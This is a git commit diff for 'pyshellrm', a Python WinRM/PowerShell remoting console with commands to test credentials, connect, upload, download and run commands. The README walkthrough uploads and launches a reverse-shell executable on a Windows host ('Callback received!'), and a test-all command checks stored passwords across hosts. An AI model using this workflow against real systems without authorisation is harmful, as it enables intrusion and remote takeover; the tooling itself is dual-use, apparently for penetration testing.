b41d0e9e1df2f1b7d399431f0a67a4a812f7355b
nbulischeck <nbulischeck@users.noreply.github.com>
2019-08-13 00:04:31 -0500

    Updated pyshellrm to use PSRP; refactored everything

--- README.md
+++ README.md
@@ -4,11 +4,14 @@
 
 All configuration options are defined in the Protocol object.
 
-1. Endpoint: The WinRM webservice endpoint
-    * `http://server.com`
+1. Server: The WinRM webservice endpoint
+    * `10.10.10.1` or `server.com`
 
-2. Transport: Transport type
-    *  \[`plaintext`, `kerberos`, `ssl`, `ntlm`, `credssp`]
+2. Port: Transport type
+    *  \[`ntlm`, `kerberos`, `credssp`]
+
+3. Path: Wsman path
+    * `weird/path/to/wsman`
 
 3. Username: The remote user's username
     *  `domain\user`
@@ -16,52 +19,31 @@ All configuration options are defined in the Protocol object.
 4. Password: The remote user's password
     *  `hunter2`
 
-5. Server Cert Validation: Whether server certificate should be validated
-    *  \[`validate`, `ignore`]
+5. SSL: Whether or not the request is HTTP or HTTPS
+    *  \[`true`, `false`]
 
 ```Yaml
 server:
-    endpoint: http://10.10.10.1:5985/wsman
-    transport: ntlm
-    username: User
-    password: Password
-    server_cert_validation: ignore
+    server: 10.10.10.149
+    port: 5985
+    auth: ntlm
+    username: Administrator
+    password: hunter2
+    ssl: false
 ```
 
 ## Commands
 
-1. connect
-2. list
-3. hosts                              
-4. set
-5. unset
-6. upload
-7. shell
-8. close
-9. exit/quit
-
-### Connect
-
-Connect uses the defined Protocol object to attempt a WinRM connection.
-
-Example:
-
-```
-pyshellrm:~$ connect server
-[*] Connecting to http://10.10.10.1:5985/wsman
-[+] Connected to http://10.10.10.1:5985/wsman
-```
-
-### List
-
-Lists the current connect shells.
-
-Example:
-
-```
-pyshellrm:~$ list
-938891EA-A825-4871-864C-C5F58A3EA135
-```
+1. hosts
+2. test
+3. test-all
+4. connect
+5. set
+6. unset
+7. upload
+8. download
+9. run
+10. exit/quit
 
 ### Hosts
 
@@ -71,23 +53,71 @@ Example:
 
 ```
 pyshellrm:~$ hosts
-server
+server_conn_pass server_conn_fail
 ```
 
-### Set
+### Test
 
-Sets the current shell.
+Test authenticating to the remote server.
 
 Example:
 
 ```
-pyshellrm:~$ set 938891EA-A825-4871-864C-C5F58A3EA135
-Current Shell: 938891EA-A825-4871-864C-C5F58A3EA135
+pyshellrm:~$ test server_conn_pass
+[+] Successfully connected to server_conn_pass with Administrator:hunter2
+```
+
+Because we're using Riposte, we can use the -c flag to run the `test` command from the cli:
+
+```
+$ python pyshellrm.py -c 'test server_conn_pass' config.yml
+[+] Successfully connected to server_conn_pass with Administrator:hunter2
+```
+
+### Test-All
+
+Test authenticating to all remote servers.
+
+Example:
+
+```
+pyshellrm:~$ test-all
+[+] Successfully connected to server_conn_pass with Administrator:hunter2
+[-] Failed to auth with server_conn_fail using Administrator:hunter3
+```
+
+Because we're using Riposte, we can use the -c flag to run the `test-all` command from the cli:
+
+```
+$ python pyshellrm.py -c 'test-all' config.yml
+[+] Successfully connected to server_conn_pass with Administrator:hunter2
+[-] Failed to auth with server_conn_fail using Administrator:hunter3
+```
+
+### Connect
+
+Connect uses the defined Protocol object to attempt a WinRM connection.
+
+Example:
+
+```
+pyshellrm:~$ connect server
+[+] Successfully connected to server with Administrator:hunter2
+```
+
+### Set
+
+Sets the current server connection.
+
+Example:
+
+```
+pyshellrm:~$ set server_conn_pass
 ```
 
 ### Unset
 
-Unsets the current shell.
+Unsets the current server connection.
 
 Example:
 
@@ -102,30 +132,41 @@ Uploads a file from `local_path` to `remote_path`.
 Example:
 
 ```
-pyshellrm:~$ upload /home/local/shell.exe "C:\Users\remote\shell.exe"
-[*] Uploading file /home/local/shell.exe to C:\Users\remote\shell.exe
-Sending chunk [0/14]
-Sending chunk [1/14]
-...
-Sending chunk [13/14]
-Sending chunk [14/14]
+pyshellrm:~$ upload "/local/path/to/shell.exe" "C:\\Users\\Administrator\\Documents\\shell.exe"
+pyshellrm:~$ run ls
+[+]
+
+    Directory: C:\Users\Administrator\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        8/13/2019  10:10 AM          73802 shell.exe
 ```
 
-### Shell
+### Download
+
+Downloads a file from `remote_path` to `local_path`.
+
+pyshellrm:~$ download "C:\\Users\\Administrator\\Documents\\doc.xlsx" "/local/path/to/doc.xlsx"
+
+### Run
 
 Runs commands in a Powershell prompt. Press ctrl+c to exit.
 
 Example:
 
 ```
-pyshellrm:~$ shell
-PS> whoami
-[+] remoteserver\administrator
+pyshellrm:~$ run ls
+[+]
+
+    Directory: C:\Users\Administrator\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        8/13/2019  10:10 AM          73802 shell.exe
 ```
-
-### Close
-
-Closes the connection to the current shell.
 
 ### Exit/Quit
 
@@ -143,52 +184,32 @@ Next we'll configure our Protocol.
 
 ```Yaml
 server:
-    endpoint: http://10.10.10.1:5985/wsman
-    transport: ntlm
+    server: 10.10.10.1
+    port: 5985
+    auth: ntlm
     username: Administrator
     password: hunter2
-    server_cert_validation: ignore
+    ssl: false
 ```
 
 Finally, we can launch the PyShellRM console and upload our reverse shell.
 
 ```
 pyshellrm:~$ connect server
-[*] Connecting to http://10.10.10.1:5985/wsman
-[+] Connected to http://10.10.10.1:5985/wsman
-pyshellrm:~$ set 85CB12CA-F0DB-468B-886B-2E4064C46727
-Current Shell: 85CB12CA-F0DB-468B-886B-2E4064C46727
-pyshellrm:~$ upload shell.exe "C:\Users\Administrator\shell.exe"
-[*] Uploading file shell.exe to C:\Users\Administrator\shell.exe
-Sending chunk [0/42]
-Sending chunk [1/42]
-...
-Sending chunk [41/42]
-Sending chunk [42/42]
-pyshellrm:~$ shell
-PS> ls
-[+] 
+[+] Successfully connected to server with Administrator:hunter2
+pyshellrm:~$ set server
+pyshellrm:~$ upload shell.exe "C:\\Users\\Administrator\\Documents\\shell.exe"
+pyshellrm:~$ run ls
+[+]
 
-    Directory: C:\Users\Administrator
+    Directory: C:\Users\Administrator\Documents
 
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
-d-r---        4/21/2019  11:08 AM                3D Objects
-d-r---        4/21/2019  11:08 AM                Contacts
-d-r---        4/22/2019   9:05 AM                Desktop
-d-r---        4/22/2019   8:13 AM                Documents
-d-r---        4/21/2019  11:08 AM                Downloads
-d-r---        4/21/2019  11:08 AM                Favorites
-d-r---        4/21/2019  11:08 AM                Links
-d-r---        4/21/2019  11:08 AM                Music
-d-r---        4/21/2019  11:08 AM                Pictures
-d-r---        4/21/2019  11:08 AM                Saved Games
-d-r---        4/21/2019  11:08 AM                Searches
-d-r---        4/21/2019  11:08 AM                Videos
--a----        8/11/2019   1:00 PM          73802 shell.exe
+-a----        8/13/2019  10:10 AM          73802 shell.exe
 
-PS> ./shell.exe
+pyshellrm:~$ run "cmd.exe /c \"shell.exe\""
 ```
 
 Callback received!
--- pyshellrm.py
+++ pyshellrm.py
@@ -1,90 +1,29 @@
-import re
-import xml
-import winrm
 import argparse
 import requests
-from base64 import b64encode
 from pathlib import Path
 from riposte import Riposte
-from collections import defaultdict
 from ruamel.yaml import YAML
+from pypsrp.client import Client
+from requests_ntlm import HttpNtlmAuth
+
+try:
+    from requests_kerberos import HTTPKerberosAuth
+    HAS_KERBEROS = True
+except ImportError:
+    HAS_KERBEROS = False
+
+try:
+    from requests_credssp import HttpCredSSPAuth
+    HAS_CREDSSP = True
+except ImportError:
+    HAS_CREDSSP = False
 
 pyshellrm = Riposte(prompt="pyshellrm:~$ ")
 pyshellrm._parser.add_argument("config", help="path to config.yml")
 
 CFG_HOSTS = None
-CUR_SHELL = None
-CUR_SESSN = None
-SHELL_IDS = []
-
-SHELL_LIST = lambda: [_[0] for _ in SHELL_IDS]
-
-upload_tpl = '''\
-$to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath("DEST")
-$parent = Split-Path $to
-if(!(Test-path $parent)) { mkdir $parent | Out-Null }
-$fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
-    $to,
-    [system.io.filemode]::Append,
-    [System.io.FileAccess]::Write,
-    [System.IO.FileShare]::ReadWrite
-)
-$bytes=[Convert]::FromBase64String('BYTES')
-$fileStream.Write($bytes, 0, $bytes.length)
-$fileStream.Dispose()
-'''
-
-def shell_required(fn):
-    def wrapper(*args, **kwargs):
-        if CUR_SHELL is None:
-            pyshellrm.error("No active session")
-            return
-        return fn(*args, **kwargs)
-    return wrapper
-
-def chunks(l, n):
-    for i in range(0, len(l), n):
-        yield l[i:i + n]
-
-def clean_error(msg):
-
-    def strip_namespace(msg):
-        p = re.compile(b"xmlns=*[\"\"][^\"\"]*[\"\"]")
-        allmatches = p.finditer(msg)
-        for match in allmatches:
-            msg = msg.replace(match.group(), b"")
-        return msg
-
-    if msg.startswith(b"#< CLIXML\r\n"):
-        msg_xml = msg[11:]
-        msg_xml = strip_namespace(msg_xml)
-        root = xml.etree.ElementTree.fromstring(msg_xml)
-        nodes = root.findall("./S")
-        new_msg = ""
-        for s in nodes:
-            new_msg += s.text.replace("_x000D__x000A_", "\n")
-        if len(new_msg):
-            return new_msg.strip()
-
-    return msg.decode('utf-8').strip()
-
-def run_cmd(command, args=()):
-    try:
-        command_id = CUR_SESSN.run_command(CUR_SHELL, command, args)
-        rs = winrm.Response(CUR_SESSN.get_command_output(CUR_SHELL, command_id))
-        CUR_SESSN.cleanup_command(CUR_SHELL, command_id)
-    except winrm.exceptions.WinRMTransportError:
-        return winrm.Response((None, b"Transport Error", None))
-    return rs
-
-def run_ps(script):
-    script = '$ProgressPreference = "SilentlyContinue";' + script
-    encoded_ps = b64encode(script.encode('utf_16_le')).decode('ascii')
-    resp = run_cmd('powershell -encodedcommand {0}'.format(encoded_ps))
-    if resp.std_out:
-        pyshellrm.success(resp.std_out.decode('utf-8'))
-    if resp.std_err:
-        pyshellrm.error(clean_error(resp.std_err))
+HOST_CONN = None
+CONNECTIONS = []
 
 @pyshellrm.command("exit")
 def exit():
@@ -94,114 +33,158 @@ def exit():
 def quit():
     raise StopIteration
 
-@pyshellrm.command("close")
-@shell_required
-def close():
-    global CUR_SHELL, CUR_SESSN
-
-    try:
-        CUR_SESSN.close_shell(CUR_SHELL)
-        CUR_SHELL, CUR_SESSN = None, None
-    except winrm.exceptions.WinRMTransportError as e:
-        pyshellrm.error(e)
-
-@pyshellrm.command("shell")
-@shell_required
-def shell():
-    while True:
-        try:
-            run_ps(input("PS> "))
-        except KeyboardInterrupt:
-            pyshellrm.info("Exiting PS shell")
-            break
-
-@pyshellrm.command("upload")
-@shell_required
-def upload(local_path: str, remote_path: str):
-    pyshellrm.status(f"Uploading file {local_path} to {remote_path}")
-
-    with open(local_path, 'rb') as f:
-        local_file = f.read()
-
-    new_tpl = upload_tpl.replace("DEST", remote_path)
-    chunk_list = list(chunks(local_file, 1750))
-    for idx, chunk in enumerate(chunk_list):
-        pyshellrm.info(f"Sending chunk [{idx}/{len(chunk_list)-1}]")
-        run_ps(new_tpl.replace("BYTES", b64encode(chunk).decode('ascii')))
-
-@pyshellrm.command("unset")
-def unset_shell():
-    global CUR_SHELL, CUR_SESSN
-    CUR_SHELL, CUR_SESSN = None, None
-
-@pyshellrm.command("set")
-def set_shell(shell: str):
-    global CUR_SHELL, CUR_SESSN
-
-    if shell not in SHELL_LIST():
-        pyshellrm.error(f"{shell} not in shell list.")
+@pyshellrm.command("run")
+def run(command: str):
+    if HOST_CONN is None:
+        pyshellrm.error("No set connection")
         return
 
-    CUR_SHELL = shell
-    CUR_SESSN = dict(SHELL_IDS)[shell]
-    pyshellrm.info(f"Current Shell: {CUR_SHELL}")
+    resp = HOST_CONN.execute_ps(command)
+    out, stream, had_err = resp
+    if out:
+        pyshellrm.success(out)
+    if had_err:
+        for error in stream.error:
+            pyshellrm.error(error)
+    if not out and not had_err:
+        pyshellrm.success("No data returned from command.")
+
+@pyshellrm.command("download")
+def download(remote_path: str, local_path: str):
+    if HOST_CONN is None:
+        pyshellrm.error("No set connection")
+        return
+
+    HOST_CONN.fetch(remote_path, local_path)
+
+@pyshellrm.command("upload")
+def upload(local_path: str, remote_path: str):
+    if HOST_CONN is None:
+        pyshellrm.error("No set connection")
+        return
+
+    HOST_CONN.copy(local_path, remote_path)
+
+@pyshellrm.command("unset")
+def unset():
+    global HOST_CONN
+    HOST_CONN = None
+
+@pyshellrm.command("set")
+def set(host: str):
+    global HOST_CONN
+
+    if not CONNECTIONS:
+        return
+
+    d = dict(CONNECTIONS)
+    HOST_CONN = d[host]
 
 @pyshellrm.complete("set")
 def set_completer(text, line, start_index, end_index):
     return [
-        shell_id
-        for shell_id in SHELL_LIST()
-        if shell_id.startswith(text)
+        host
+        for host in dict(CONNECTIONS).keys()
+        if host.startswith(text)
     ]
-
-@pyshellrm.command("list")
-def list_sessions():
-    if not SHELL_IDS:
-        pyshellrm.error("No active sessions")
-    else:
-        pyshellrm.info(*SHELL_LIST())
-
-@pyshellrm.command("hosts")
-def list_hosts():
-    if not CFG_HOSTS:
-        pyshellrm.error("No active sessions")
-    else:
-        pyshellrm.info(*CFG_HOSTS)
 
 @pyshellrm.command("connect")
 def connect(host: str):
-    global SHELL_IDS
+    global CONNECTIONS
 
-    host = CFG_HOSTS[host]
-    p = winrm.protocol.Protocol(
-        endpoint  = host.get("endpoint" , None),
-        transport = host.get("transport", 'ntlm'),
-        username  = host.get("username" , r''),
-        password  = host.get("password" , r''),
-        server_cert_validation = \
-            host.get("server_cert_validation", 'ignore')
+    if not test(host):
+        return False
+
+    _host = CFG_HOSTS[host]
+
+    c = Client(
+            server    = _host.get("server", None),
+            port      = _host.get("port", 5985),
+            path      = _host.get("path", "wsman"),
+            username  = _host.get("username" , r''),
+            password  = _host.get("password" , r''),
+            auth      = _host.get("auth", "ntlm"),
+            ssl       = _host.get("ssl", False),
     )
 
-    pyshellrm.status(f"Connecting to {p.transport.endpoint}")
-    try:
-        shell_id = p.open_shell()
-        SHELL_IDS.append((shell_id, p))
-    except requests.exceptions.ConnectTimeout:
-        pyshellrm.error(f"Failed to connect to {p.transport.endpoint}")
-        return
-    except winrm.exceptions.WinRMTransportError as e:
-        pyshellrm.error(e)
-        return
-    except winrm.exceptions.InvalidCredentialsError as e:
-        pyshellrm.error(e)
-        return
-    except winrm.exceptions.WinRMError as e:
-        pyshellrm.error(e)
-        return
-    pyshellrm.success(f"Connected to {p.transport.endpoint}")
+    CONNECTIONS.append((host, c))
+
+    return True
 
 @pyshellrm.complete("connect")
 def connect_completer(text, line, start_index, end_index):
+    return [
+        host
+        for host in CFG_HOSTS.keys()
+        if host.startswith(text)
+    ]
+
+@pyshellrm.command("hosts")
+def hosts():
+    print(*CFG_HOSTS)
+
+@pyshellrm.command("test-all")
+def test_all():
+    [test(host) for host in CFG_HOSTS]
+
+@pyshellrm.command("test")
+def test(host: str):
+    session = requests.Session()
+    session.verify = False
+
+    _host = CFG_HOSTS.get(host, None)
+    if not _host:
+        pyshellrm.error("Invalid host name")
+        return False
+
+    server    = _host.get("server", None)
+    port      = _host.get("port", 5985)
+    path      = _host.get("path", "wsman")
+    username  = _host.get("username" , r'')
+    password  = _host.get("password" , r'')
+    auth      = _host.get("auth", "ntlm")
+    ssl       = _host.get("ssl", False)
+
+    req_url  = "http://" if not ssl else "https://"
+    req_url += f"{server}:{port}/{path}"
+
+    if auth == "ntlm":
+        session.auth = HttpNtlmAuth(username, password)
+    elif auth == "kerberos":
+        if not HAS_KERBEROS:
+            pyshellrm.error(
+                f"{auth} auth attempt without requests-kerberos installed"
+            )
+            return False
+        session.auth = HTTPKerberosAuth()
+    elif auth == "credssp":
+        if not HAS_CREDSSP:
+            pyshellrm.error(
+                f"{auth} auth attempt without requests-credssp installed"
+            )
+            return False
+        session.auth = HttpCredSSPAuth(f'{username}', f'{password}',
+                               auth_mechanism='auto')
+
+    try:
+        if not session.post(req_url).ok:
+            pyshellrm.error(
+                f"Failed to auth with {host} using {username}:{password}"
+            )
+            return False
+    except requests.exceptions.ConnectionError:
+        pyshellrm.error(
+            f"Failed to establish a connection to {host}"
+        )
+        return False
+
+    pyshellrm.success(
+        f"Successfully connected to {host} with {username}:{password}"
+    )
+    return True
+
+@pyshellrm.complete("test")
+def test_completer(text, line, start_index, end_index):
     return [
         host
         for host in CFG_HOSTS.keys()
@@ -213,7 +196,7 @@ def get_config(config_path):
 
     config = Path(config_path)
     if not config.is_file():
-        print("Config file not found")
+        print("Config file not found.")
         quit()
 
     with open(config_path, 'r') as cfg:
@@ -221,10 +204,8 @@ def get_config(config_path):
         CFG_HOSTS = yaml.load(cfg)
 
     for key in CFG_HOSTS:
-        d = CFG_HOSTS[key]
-        if not d.get("endpoint", None):
-            print("Every host must have an endpoint")
-            quit()
+        if not "server" in CFG_HOSTS[key]:
+            raise KeyError("server")
 
 arguments = pyshellrm._parser.parse_args()
 get_config(arguments.config)
